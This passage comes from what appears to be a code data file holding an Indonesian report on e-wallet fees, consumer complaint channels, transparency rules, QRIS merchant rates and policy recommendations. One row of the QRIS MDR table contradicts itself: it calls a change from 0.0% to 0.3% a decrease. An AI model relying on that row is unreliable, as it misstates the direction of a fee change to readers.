          "[TABLE:[Sistem pembayaran dan infrastruktur|Ya|Tidak],[Uang elektronik dan e-wallet (aspek payment)|Ya|Tidak],[Paylater / kredit digital|Tidak|Ya],[Asuransi digital|Tidak|Ya],[Investasi digital (reksa dana, SBN)|Tidak|Ya],[Perlindungan konsumen keuangan digital|Bersama|Bersama],[Data privasi dalam konteks keuangan|Bersama|Bersama]]",
          "",
          "Saluran Pengaduan Resmi:",
          "[TABLE_HEADER:Institusi|Kontak|Cakupan Pengaduan]",
          "[TABLE:[Bank Indonesia|Telepon: 131 (gratis, 24 jam)|Biaya tersembunyi, ketidaksesuaian tarif, masalah sistem pembayaran],[Bank Indonesia|Email: bicara@bi.go.id|Pengaduan tertulis terkait sistem pembayaran],[Bank Indonesia|Website: www.bi.go.id - menu Pengaduan|Pengaduan online],[OJK|Telepon: 157 (gratis, jam kerja)|Masalah Paylater, asuransi digital, investasi],[OJK|Email: konsumen@ojk.go.id|Pengaduan tertulis layanan keuangan digital],[OJK|Website: konsumen.ojk.go.id|Portal pengaduan online OJK],[Internal Platform|Menu 'Bantuan' / 'Help' di aplikasi|Pengaduan tahap pertama sebelum eskalasi],[BPKN|bpkn.go.id|Perlindungan konsumen umum]]",
          "",
          "[QUOTE:HAK KONSUMEN: Berdasarkan PBI No. 23/6/PBI/2021, konsumen BERHAK melaporkan platform e-wallet ke Bank Indonesia apabila: (1) dikenakan biaya yang tidak ditampilkan sebelum transaksi; (2) biaya yang dikenakan berbeda dari yang tertera; (3) terdapat perubahan tarif tanpa pemberitahuan yang memadai. Ini bukan hanya 'boleh melaporkan' ini adalah hak yang dilindungi regulasi.]"
        ]
      },
      {
        id: "sec-11",
        title: "11. Transparansi Biaya: Kewajiban dan Praktik di Lapangan",
        level: 1,
        content: [
          "Standar Transparansi yang Diwajibkan Regulasi:",
          "Pra-konfirmasi transaksi: Setiap biaya harus ditampilkan jelas di layar konfirmasi SEBELUM pengguna menekan tombol bayar/kirim.",
          "Rincian biaya: Tidak cukup hanya menampilkan total komponen biaya (biaya transaksi, biaya admin, dll.) harus dirinci.",
          "Format yang mudah dipahami: Informasi biaya harus disajikan dalam Bahasa Indonesia yang jelas, bukan dalam bahasa teknis yang membingungkan.",
          "Pemberitahuan perubahan: Setiap perubahan tarif harus dikomunikasikan minimal 30 hari sebelum berlaku.",
          "Aksesibilitas informasi: Daftar lengkap biaya layanan harus mudah ditemukan dalam aplikasi.",
          "",
          "Langkah Pengguna Jika Menemukan Pelanggaran Transparansi:",
          "1. Dokumentasikan bukti: screenshot layar sebelum dan sesudah transaksi yang menunjukkan perbedaan biaya.",
          "2. Laporkan ke layanan pelanggan platform terlebih dahulu catat nomor tiket pengaduan.",
          "3. Jika tidak ada respons memuaskan dalam 3-5 hari kerja, eskalasikan ke Bank Indonesia melalui 131.",
          "4. Simpan semua komunikasi sebagai bukti pengaduan lanjutan.",
          "5. Jika terkait produk keuangan (Paylater, dll.), paralel laporkan ke OJK melalui 157."
        ]
      },
      {
        id: "sec-12",
        title: "12. Ekosistem Bisnis dan Interkoneksi E-Wallet",
        level: 1,
        content: [
          "Interoperabilitas - BI-FAST dan QRIS sebagai Fondasi:",
          "BI-FAST: Diluncurkan Desember 2021, memungkinkan transfer antar bank secara real-time 24/7 dengan biaya maksimal Rp 2.500 dari sisi bank. Sejak implementasi BI-FAST, biaya transfer antar bank turun drastis namun e-wallet belum sepenuhnya meneruskan efisiensi ini ke pengguna.",
          "QRIS: Satu kode QR untuk semua platform meningkatkan efisiensi merchant dan konsumen sekaligus. BI mewajibkan semua e-wallet berlisensi mendukung QRIS.",
          "Interkoneksi e-wallet: BI mendorong interoperabilitas penuh antar e-wallet pengguna GoPay dapat transfer ke pengguna OVO dan sebaliknya.",
          "",
          "Konsolidasi Industri - Tren Merger dan Akuisisi:",
          "Industri e-wallet Indonesia sedang memasuki fase konsolidasi, di mana pemain-pemain dengan basis pengguna lebih kecil menghadapi tekanan untuk bergabung atau diakuisisi oleh pemain lebih besar. Merger GoTo (Gojek + Tokopedia) adalah contoh paling nyata dari tren ini.",
          "Implikasi bagi konsumen: Konsolidasi dapat mengurangi persaingan dan mengurangi tekanan downward terhadap biaya.",
          "Pemain baru: Masuknya bank digital (seperti Bank Jago, SeaBank, Blu BCA) yang menawarkan fitur mirip e-wallet dengan regulasi perbankan yang lebih ketat menambah dinamika persaingan."
        ]
      },
      {
        id: "sec-13",
        title: "13. Analisis Risiko Konsumen",
        level: 1,
        content: [
          "Risiko Finansial:",
          "[TABLE_HEADER:Kategori Merchant|MDR|Berlaku Sejak|Catatan]",
          "[TABLE:[Usaha Mikro|0.3%|1 Juli 2023|Turun dari 0.0% (sebelumnya gratis)],[Usaha Kecil, Menengah, Besar|0.7%|Standar berlaku|Sudah berlaku sejak QRIS diluncurkan],[Merchant Pendidikan|0.6%|Standar berlaku|Kategori khusus sektor pendidikan],[Merchant SPBU|0.4%|Standar berlaku|Kategori khusus bahan bakar],[Merchant Pemerintah|0.0%|Standar berlaku|Transaksi pemerintah bebas MDR]]",
          "",
          "Risiko Keamanan dan Privasi:",
          "Pencurian akun: Akun e-wallet dengan saldo besar menjadi target phishing dan social engineering.",
          "Data pribadi: Transaksi e-wallet merekam pola perilaku konsumsi yang sangat detail data ini bernilai tinggi bagi industri advertising.",
          "Penipuan QRIS palsu: Kode QR di merchant dapat diganti dengan QR palsu oleh penipu selalu verifikasi nama merchant sebelum bayar.",
          "Paylater fraud: Jika akun e-wallet diambil alih, fitur Paylater dapat disalahgunakan untuk transaksi tidak sah atas nama korban."
        ]
      },
      {
        id: "sec-14",
        title: "14. Strategi Mitigasi Biaya bagi Konsumen",
        level: 1,
        content: [
          "Berdasarkan analisis struktur biaya dan ekosistem e-wallet yang telah diuraikan, berikut adalah panduan praktis yang dapat diterapkan konsumen untuk mengoptimalkan penggunaan e-wallet dan meminimalkan biaya yang tidak perlu.",
          "",
          "Strategi Jangka Pendek - Dapat Diterapkan Segera:",
          "1. Identifikasi bank partner e-wallet Anda: Cek di aplikasi e-wallet, bagian 'Top Up' atau 'Isi Saldo' bank partner biasanya tertera dengan label 'Gratis'. Buka rekening di bank partner tersebut untuk mendapatkan top-up gratis.",
          "2. Gunakan BI-FAST untuk transfer antar bank: Banyak mobile banking sekarang menawarkan transfer via BI-FAST dengan biaya jauh lebih rendah.",
          "3. Bayar langsung dari mobile banking via QRIS: Jika mobile banking Anda mendukung scan QRIS langsung, gunakan ini untuk menghindari biaya top-up e-wallet.",
          "4. Minimalisasi penarikan saldo ke bank: Jika saldo ada di e-wallet, habiskan di sana. Setiap transfer ke bank kena Rp 2.500.",
          "5. Kelola saldo dengan bijak: Jaga saldo e-wallet sesuai kebutuhan transaksi reguler tidak terlalu besar dan tidak terlalu kecil.",
          "",
          "Strategi Jangka Menengah:",
          "1. Konsolidasikan penggunaan ke satu ekosistem: Memiliki lebih sedikit e-wallet aktif berarti lebih sedikit biaya transfer antar platform.",
          "2. Audit biaya e-wallet tahunan: Minimal setahun sekali, periksa mutasi rekening/e-wallet untuk menghitung total biaya admin.",
          "3. Manfaatkan program loyalitas secara optimal: Cashback dan poin yang ditawarkan platform dapat mengimbangi biaya transaksi.",
          "4. Evaluasi kebutuhan Paylater: Hitung bunga efektif Paylater dan bandingkan dengan alternatif lain."
        ]
      },
      {
        id: "sec-15",
        title: "15. Rekomendasi Kebijakan",
        level: 1,
        content: [
          "Untuk Bank Indonesia:",
          "1. Penguatan mandatori transparansi biaya: Terapkan standar tampilan biaya yang seragam di semua platform termasuk APR untuk produk kredit digital.",
          "2. Percepatan interoperabilitas penuh: Dorong implementasi interoperabilitas yang lebih sempurna.",
          "3. Kajian batas biaya transaksi: Pertimbangkan penetapan batas atas (cap) biaya transfer e-wallet ke bank.",
          "4. Edukasi keuangan digital massal: Perkuat program edukasi tentang struktur biaya dan hak konsumen.",
          "",
          "Untuk OJK:",
          "1. Pengawasan ketat Paylater: Standardisasi cara presentasi APR produk Paylater agar konsumen dapat membandingkan.",
          "2. Perlindungan data konsumen: Perkuat regulasi tentang penggunaan data transaksi pengguna.",
          "3. Mekanisme pengaduan yang lebih responsif: Tetapkan standar waktu respons pengaduan yang lebih ketat.",
          "",
          "Untuk Platform E-Wallet:",
          "1. Proaktif dalam transparansi: Tampilkan total biaya kumulatif yang telah dibayarkan pengguna dalam fitur riwayat atau ringkasan tahunan.",
          "2. Sederhanakan struktur biaya: Struktur biaya yang terlalu kompleks menciptakan kebingungan.",
          "3. Edukasi pengguna aktif: Investasikan dalam konten edukatif yang membantu pengguna memahami cara menggunakan layanan secara optimal."
        ]
      },
      {
        id: "sec-16",
        title: "16. Kesimpulan",
        level: 1,
        content: [
          "Industri e-wallet Indonesia telah mencapai kematangan yang signifikan dalam waktu kurang dari satu dekade. Dari platform yang sepenuhnya disubsidi untuk membangun kebiasaan digital, kini menjadi entitas bisnis yang mengoperasikan revenue stream yang kompleks dan beragam.",
          "Biaya transaksi yang dikenakan kepada pengguna meskipun terlihat kecil secara individual membentuk kontribusi pendapatan yang sangat signifikan ketika dihitung pada skala puluhan juta pengguna aktif.",
          "Namun penting untuk menekankan: penggunaan e-wallet, jika dilakukan secara cerdas, tetap memberikan nilai nyata kepada konsumen melalui kemudahan, keamanan, dan berbagai cashback/promo yang masih ditawarkan. Kunci adalah kesadaran pemahaman yang baik tentang struktur biaya memungkinkan konsumen membuat keputusan yang lebih informed.",
          "",
          "Ringkasan Poin-Poin Kunci:",
          "- Struktur biaya e-wallet mencakup 8 komponen utama dari top-up, transfer, penarikan, hingga MDR merchant.",
          "- Total biaya tahunan seorang pengguna aktif dapat mencapai Rp 300.000-500.000+ berdasarkan frekuensi transaksi.",
          "- Float income dan Paylater merupakan sumber pendapatan e-wallet yang sering tidak disadari konsumen.",
          "- MDR QRIS 0.3-0.7% dibayar merchant berpotensi dibebankan kembali ke konsumen melalui harga jual.",
          "- Strategi top-up dari bank partner adalah cara termudah menghilangkan biaya top-up.",
          "- PBI No. 23/6/PBI/2021 mewajibkan transparansi biaya penuh sebelum konfirmasi transaksi.",
          "- Bank Indonesia (131) dan OJK (157) adalah saluran pengaduan resmi jika ada pelanggaran transparansi.",
          "- Scan QRIS dari mobile banking langsung adalah cara optimal menghindari biaya top-up e-wallet.",
          "",
          "[QUOTE:CATATAN AKHIR DAN DISCLAIMER: Laporan ini disusun berdasarkan informasi yang tersedia secara publik, regulasi Bank Indonesia dan OJK yang dapat diakses melalui situs resmi, serta analisis independen terhadap struktur industri pembayaran digital Indonesia. Seluruh estimasi kalkulasi bersifat ilustratif berdasarkan asumsi yang disebutkan secara eksplisit bukan data keuangan audited. Tujuan laporan ini adalah semata-mata edukasi dan peningkatan literasi keuangan digital.]"
        ]
      },
      {
        id: "sec-17",
        title: "17. Referensi dan Dasar Hukum",
        level: 1,
        content: [
          "Regulasi dan Peraturan:",
          "-- PBI No. 23/6/PBI/2021 - Peraturan Bank Indonesia tentang Penyedia Jasa Pembayaran - bi.go.id",
          "-- PBI No. 22/23/PBI/2020 - Peraturan Bank Indonesia tentang Sistem Pembayaran - bi.go.id",
          "-- PBI No. 20/6/PBI/2018 - Peraturan Bank Indonesia tentang Uang Elektronik - bi.go.id",
          "-- SE BI No. 18/41/DKSP - Surat Edaran BI tentang Penyelenggaraan Pemrosesan Transaksi Pembayaran",
          "-- POJK No. 10/POJK.05/2022 - POJK tentang Layanan Pendanaan Bersama Berbasis Teknologi Informasi",
          "-- POJK No. 77/POJK.01/2016 - POJK tentang Layanan Pinjam Meminjam Uang Berbasis Teknologi Informasi",
          "",
          "Sumber Data dan Referensi Industri:",
          "-- Statistik Sistem Pembayaran BI - Publikasi bulanan Bank Indonesia - bi.go.id/id/statistik/sistem-pembayaran",
          "-- Laporan Tahunan Bank Indonesia 2022-2023 - Analisis industri pembayaran digital",
          "-- QRIS - Informasi Resmi Bank Indonesia - bi.go.id/qris",
          "-- OJK - Edukasi Keuangan Digital - sikapiuangmu.ojk.go.id",
          "-- AFTECH - Asosiasi FinTech Indonesia - aftech.or.id",
          "-- ASPI - Asosiasi Sistem Pembayaran Indonesia - Data industri sistem pembayaran"
        ]
      }
    ],
    references: [
      "PBI No. 23/6/PBI/2021 - Peraturan Bank Indonesia tentang Penyedia Jasa Pembayaran. https://bi.go.id",
      "PBI No. 22/23/PBI/2020 - Peraturan Bank Indonesia tentang Sistem Pembayaran. https://bi.go.id",
      "PBI No. 20/6/PBI/2018 - Peraturan Bank Indonesia tentang Uang Elektronik. https://bi.go.id",
      "SE BI No. 18/41/DKSP - Surat Edaran BI tentang Penyelenggaraan Pemrosesan Transaksi Pembayaran",
      "POJK No. 10/POJK.05/2022 - POJK tentang Layanan Pendanaan Bersama Berbasis Teknologi Informasi",
      "POJK No. 77/POJK.01/2016 - POJK tentang Layanan Pinjam Meminjam Uang Berbasis Teknologi Informasi",
      "Statistik Sistem Pembayaran BI. https://bi.go.id/id/statistik/sistem-pembayaran",
      "QRIS - Informasi Resmi Bank Indonesia. https://bi.go.id/qris",
      "OJK - Edukasi Keuangan Digital. https://sikapiuangmu.ojk.go.id",
      "AFTECH - Asosiasi FinTech Indonesia. https://aftech.or.id",
      "ASPI - Asosiasi Sistem Pembayaran Indonesia"
    ]
  }
];
